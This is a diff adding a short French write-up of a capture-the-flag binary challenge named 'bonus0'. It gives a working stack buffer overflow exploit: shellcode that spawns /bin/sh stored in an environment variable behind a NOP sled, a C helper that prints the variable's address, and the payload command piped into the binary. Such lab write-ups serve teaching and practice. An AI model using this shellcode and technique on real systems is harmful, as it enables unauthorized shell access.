@@ -1,0 +1,26 @@
+Pour resoudre ce challenge nous avons fait un bufferoverflow.
+Nous avons exploite le buffer du main pour faire pointer eip vers une variable d'env,
+que nous avons declare, dans la quelle nous avons place un shellcode permettant d'executer
+/bin/sh.
+
+exportation du shellcode dans le env:
+export TMP=$(python -c "print '\x90' * 5000 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
+
+Entre ces deux etapes nous avons cherche l'adresse de TMP grace a un binaire c
+
+'
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    char* ptr = getenv("TMP");
+    printf("%p\n", ptr);
+}
+'
+overflow du buffer:
+python -c "print '\x90' * 4095 + '\n' + '\x90' * 14 + '\x90\xeb\xff\xbf' + '\x90'" > /tmp/test
+
+adresse de la variable d'env: \x90\xeb\xff\xbf
+
+cat /tmp/test - | ./bonus0
